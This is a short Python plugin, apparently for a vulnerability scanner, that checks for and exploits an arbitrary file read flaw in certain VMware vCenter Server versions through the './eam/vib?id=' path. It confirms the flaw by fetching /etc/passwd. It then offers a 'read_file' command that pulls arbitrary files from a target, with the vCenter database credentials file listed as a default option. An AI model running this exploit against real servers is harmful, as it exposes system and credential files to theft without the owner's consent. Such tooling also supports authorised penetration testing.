# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Vmware vCenter vid 任意文件读取漏洞",
        "keyword": "title=\"ID_VC_Welcome\"",
        "version": "VMware vCenter Server 6.5.0a- f 版本",
        "description": "VMware vCenter特定版本存在任意文件读取漏洞, 攻击者通过构造特定的请求,可以读取服务器上任意文件",
        "references": ["-"],
    }

    def __condition__(self):
        return self.condition(
            matches=[
                {
                    "search": "body",
                    "keyword": ["VMware", "ID_VISDK", "download"]
                }
            ]
        )

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./eam/vib?id=/etc/passwd',
            timeout=15
        )
        if r.status_code == 200 and 'root:/root' in r.text:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='读取系统文件')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("file", help="读取的文件", choice=[r"C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties", "/etc/passwd"])
    def read_file(self, url, file):
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(
                url,
                f'./eam/vib?id={file}'
            ),
            timeout=15
        )
        if r.status_code == 200:
            return r.text
